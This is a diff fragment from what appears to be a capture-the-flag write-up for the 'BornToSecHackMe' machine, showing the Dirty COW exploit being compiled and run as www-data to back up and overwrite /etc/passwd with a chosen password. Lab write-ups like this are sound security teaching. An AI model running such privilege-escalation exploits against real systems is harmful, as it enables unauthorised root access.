@@ -34,7 +34,7 @@ www-data@BornToSecHackMe:~$ gcc -pthread dirty.c -o dirty -lcrypt
 We then run the exploit with a password of our choice (in this case, `"password"`):
 
 ```bash
-www-data@BornToSecHackMe:~$ ./dirty password
+www-data@BornToSecHackMe:~$ ./dirty
 /etc/passwd successfully backed up to /tmp/passwd.bak
 Please enter the new password: password
 Complete line:
